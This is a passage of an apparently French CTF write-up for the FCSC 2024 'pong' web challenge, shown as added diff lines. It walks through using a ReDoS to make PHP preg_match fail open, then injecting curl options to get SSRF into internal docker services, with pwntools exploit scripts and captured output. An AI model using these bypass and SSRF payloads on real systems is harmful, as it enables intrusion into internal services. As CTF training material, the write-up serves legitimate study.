+<p>However, it is possible to provoke a ReDoS <em>(Regular expression Denial of Service)</em> attack by sending a large succession of <code>.</code> . So by sending a string of characters of the form <code>voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec</code> the <code>preg_match</code> function will crash.<br>
+Finally, the default error result is <em>false</em>, allowing you to bypass these checks.</p>
+<p>By combining docker aliases with redos, it&rsquo;s possible to query the application&rsquo;s internal services.</p>
+<p>Our operating code can be updated:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> urllib.parse <span style="color:#f92672">import</span> quote_plus <span style="color:#66d9ef">as</span> urlenc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;critical&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>, <span style="color:#ae81ff">8000</span>, ssl<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>redos <span style="color:#f92672">=</span> urlenc(<span style="color:#e6db74">&#39;?a=&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;voz.ec&#39;</span> <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">30</span>)))
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/?game=pong-frontend</span><span style="color:#e6db74">{</span>redos<span style="color:#e6db74">}</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">GET </span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74"> HTTP/1.1</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host: localhost:8000</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Connection: close</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Upgrade-Insecure-Requests: 1</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>result <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvall(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">30</span>)
+</span></span><span style="display:flex;"><span>print(str(result)[<span style="color:#ae81ff">2</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#39;</span>,<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>))
+</span></span></code></pre></div><h2 id="bypass-remote_addr">Bypass REMOTE_ADDR</h2>
+<p>To bypass the ip check, a curl request can be made from the frontend to the fronted.<br>
+Combined with the redos method, it&rsquo;s possible to pass <em>GET</em> arguments to the 2nd request.</p>
+<p>You can also add <em>options</em> to curl!<br>
+These come from the <code>php-curl</code> library and can be used in int form. For each option, there&rsquo;s an int equivalent, allowing you to pass options as parameters.</p>
+<p>All options for <code>curl_setopt</code> are listed here:</p>
+<ul>
+<li><a href="https://www.php.net/manual/en/function.curl-setopt.php" target="_blank">https://www.php.net/manual/en/function.curl-setopt.php</a></li>
+</ul>
+<p>The equivalents are referenced here:</p>
+<ul>
+<li><a href="https://gist.github.com/jseidl/3218673" target="_blank">https://gist.github.com/jseidl/3218673</a><br>
+They can also be retrieved in php.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">CURLOPT_USERAGENT</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">10018</span>
+</span></span></code></pre></div><p>By adding <code>&amp;b=</code> to the end of the url, the url formed will be the following:</p>
+<pre tabindex="0"><code>http://&lt;game&gt;?a=&lt;redos&gt;&amp;options[...]=...&amp;b=.fcsc2024.fr:5000
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> urllib.parse <span style="color:#f92672">import</span> quote_plus <span style="color:#66d9ef">as</span> urlenc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;critical&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>redos <span style="color:#f92672">=</span> urlenc(<span style="color:#e6db74">&#39;?a=&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;voz.ec&#39;</span> <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">30</span>)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ssrf</span>(where, options):
+</span></span><span style="display:flex;"><span>	io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>, <span style="color:#ae81ff">8000</span>, ssl<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">=</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/?game=localhost</span><span style="color:#e6db74">{</span>redos<span style="color:#e6db74">}</span><span style="color:#e6db74">%26game%3d</span><span style="color:#e6db74">{</span>where<span style="color:#e6db74">}{</span>options<span style="color:#e6db74">}</span><span style="color:#e6db74">%26b%3D
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>	io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">GET </span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74"> HTTP/1.1</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host: localhost:8000</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Connection: close</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Upgrade-Insecure-Requests: 1</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	result <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvall(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">30</span>)
+</span></span><span style="display:flex;"><span>	print(str(result)[<span style="color:#ae81ff">2</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#39;</span>,<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mapping <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;CURLOPT_USERAGENT&#39;</span>: <span style="color:#e6db74">&#39;10018&#39;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>options <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&amp;&#39;</span><span style="color:#f92672">.</span>join([
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;&#39;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;options[CURLOPT_USERAGENT]=HelloThere&#39;</span>,
+</span></span><span style="display:flex;"><span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> k, v <span style="color:#f92672">in</span> mapping<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span>	options <span style="color:#f92672">=</span> options<span style="color:#f92672">.</span>replace(k, v)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ssrf(
+</span></span><span style="display:flex;"><span>    where<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;pong&#39;</span>,
+</span></span><span style="display:flex;"><span>    options<span style="color:#f92672">=</span>urlenc(options)
+</span></span><span style="display:flex;"><span>)
+</span></span></code></pre></div><p>Finally, to check that the options have been added correctly, I&rsquo;ve added a listening TCP socket to debug received requests and view them in raw.</p>
+<p>Here&rsquo;s the executed application:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span> os<span style="color:#f92672">,</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Listening on port 2222&#39;</span>, flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>server_socket <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)    
+</span></span><span style="display:flex;"><span>server_socket<span style="color:#f92672">.</span>setsockopt(socket<span style="color:#f92672">.</span>SOL_SOCKET, socket<span style="color:#f92672">.</span>SO_REUSEADDR, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>server_socket<span style="color:#f92672">.</span>bind((<span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, <span style="color:#ae81ff">2222</span>))    
+</span></span><span style="display:flex;"><span>server_socket<span style="color:#f92672">.</span>listen(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>    client_socket, client_address <span style="color:#f92672">=</span> server_socket<span style="color:#f92672">.</span>accept() 
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> client_socket<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">2048</span>)
+</span></span><span style="display:flex;"><span>    data_dec <span style="color:#f92672">=</span> str(data)[<span style="color:#ae81ff">2</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">------------------------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Request: </span><span style="color:#e6db74">{</span>str(i)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">------------------------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Data: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#e6db74">{</span>str(data)<span style="color:#e6db74">}</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Decoded:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#e6db74">{</span>data_dec<span style="color:#e6db74">}</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">------------------------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>, flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    client_socket<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><p>You can check that the options are actually being used, using the User-Agent for example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ssrf(
+</span></span><span style="display:flex;"><span>    where<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;host.docker.internal:2222&#39;</span>,
+</span></span><span style="display:flex;"><span>    options<span style="color:#f92672">=</span>urlenc(options)
+</span></span><span style="display:flex;"><span>)
+</span></span></code></pre></div><p>The result is</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">------------------------------------------------</span>
+</span></span><span style="display:flex;"><span>Request: <span style="color:#ae81ff">0</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">------------------------------------------------</span>
+</span></span><span style="display:flex;"><span>Data:
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;GET /?a=voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.voz.ec.fcsc2024.fr:5000 HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Host: host.docker.internal:2222</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">User-Agent: HelloThere</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Accept: */*</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Decoded:
+</span></span><span style="display:flex;"><span>GET <span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">?</span>a<span style="color:#f92672">=</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>voz<span style="color:#f92672">.</span>ec<span style="color:#f92672">.</span>fcsc2024<span style="color:#f92672">.</span>fr:<span style="color:#ae81ff">5000</span> HTTP<span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host: host<span style="color:#f92672">.</span>docker<span style="color:#f92672">.</span>internal:<span style="color:#ae81ff">2222</span>
+</span></span><span style="display:flex;"><span>User<span style="color:#f92672">-</span>Agent: HelloThere
+</span></span><span style="display:flex;"><span>Accept: <span style="color:#f92672">*/*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">------------------------------------------------</span>
+</span></span></code></pre></div><h1 id="analysis-of-the-3-other-services">Analysis of the 3 other services.</h1>
+<p>The service we&rsquo;re most interested in is the one that returns the flag:</p>
+<ul>
+<li><code>pong-flag.fcsc2024.fr</code></li>
+</ul>
+<p>It&rsquo;s a nodejs application, exposed internally on port 3000:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;express&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span>  <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">PORT</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3000</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>((<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">headers</span>[<span style="color:#e6db74">&#34;host&#34;</span>] <span style="color:#f92672">!==</span> <span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">FLAG_DOMAIN</span><span style="color:#e6db74">}</span><span style="color:#e6db74">.fcsc2024.fr:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">PORT</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;403 Forbidden!&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">FLAG</span>);
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#a6e22e">PORT</span>, () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Pong running on port </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">PORT</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>The application returns the flag if the <code>HOST</code> header of our request matches the machine&rsquo;s domain.</p>
+<p>In the <code>docker-compose.yml</code> provided, the example domain is <code>fake_domain</code>. Note the following comment:</p>
+<pre tabindex="0"><code># not the same on the remote instance
+</code></pre><p>We can confirm our understanding of the code by using ssrf:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ssrf(
+</span></span><span style="display:flex;"><span>    where<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;fake_domain.fcsc2024.fr:3000&#39;</span>,
+</span></span><span style="display:flex;"><span>    options<span style="color:#f92672">=</span>urlenc(options)
+</span></span><span style="display:flex;"><span>)
+</span></span></code></pre></div><p><em>Output:</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 pong_lab.py
+</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Date: Fri, <span style="color:#ae81ff">12</span> Apr <span style="color:#ae81ff">2024</span> 02:17:10 GMT
+</span></span><span style="display:flex;"><span>Server: Apache/2.4.59 <span style="color:#f92672">(</span>Unix<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>X-Powered-By: PHP/8.2.17
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">22</span>
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>FCSC<span style="color:#f92672">{</span>flag_placeholder<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Great! We know how to find the flag, we just need to know the subdomain of <em>fcsc2024.fr</em> and make a simple request via the ssrf.</p>
+<h3 id="service-pong">Service pong</h3>
+<p>On port <em>5000</em> of <code>pong.fcsc2024.fr</code> is exposed a site coded in python with the framework <a href="https://github.com/tornadoweb/tornado" target="_blank">Tornado</a></p>
+<p>Here are the application files:</p>
+<ul>
+<li><code>public/js/main.js</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// TODO
+</span></span></span></code></pre></div><ul>
+<li><code>public/index.html</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>...
+</span></span></code></pre></div><ul>
+<li><code>app.py</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> tornado.ioloop
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> tornado.web
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>tornado<span style="color:#f92672">.</span>web<span style="color:#f92672">.</span>_unicode <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> value: value<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>, <span style="color:#e6db74">&#34;replace&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_app</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> tornado<span style="color:#f92672">.</span>web<span style="color:#f92672">.</span>Application([
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;/?(.*)&#34;</span>, tornado<span style="color:#f92672">.</span>web<span style="color:#f92672">.</span>StaticFileHandler, { <span style="color:#e6db74">&#34;path&#34;</span>: <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;default_filename&#34;</span>: <span style="color:#e6db74">&#34;index.html&#34;</span> }),
+</span></span><span style="display:flex;"><span>    ])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    app <span style="color:#f92672">=</span> make_app()
+</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>listen(<span style="color:#ae81ff">5000</span>)
+</span></span><span style="display:flex;"><span>    tornado<span style="color:#f92672">.</span>ioloop<span style="color:#f92672">.</span>IOLoop<span style="color:#f92672">.</span>current()<span style="color:#f92672">.</span>start()
+</span></span></code></pre></div><p>This is the application that contains the &ldquo;pong&rdquo; game, visible when the application is used legitimately.<br>
+This service will be used in the rest of the operation.</p>
+<h3 id="service-dns">Service dns</h3>
+<p>Finally, the infra. contains an internal DNS, coded in Python:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> dnslib.server <span style="color:#f92672">import</span> DNSServer, BaseResolver
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> dnslib <span style="color:#f92672">import</span> RR, QTYPE, RCODE, A
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> dns <span style="color:#f92672">import</span> resolver
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> os <span style="color:#f92672">import</span> environ
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> threading
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DOMAINS <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;frontend.fcsc2024.fr.&#34;</span>: environ[<span style="color:#e6db74">&#34;FRONTEND_IP&#34;</span>],
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;pong.fcsc2024.fr.&#34;</span>: environ[<span style="color:#e6db74">&#34;BACKEND_IP&#34;</span>],
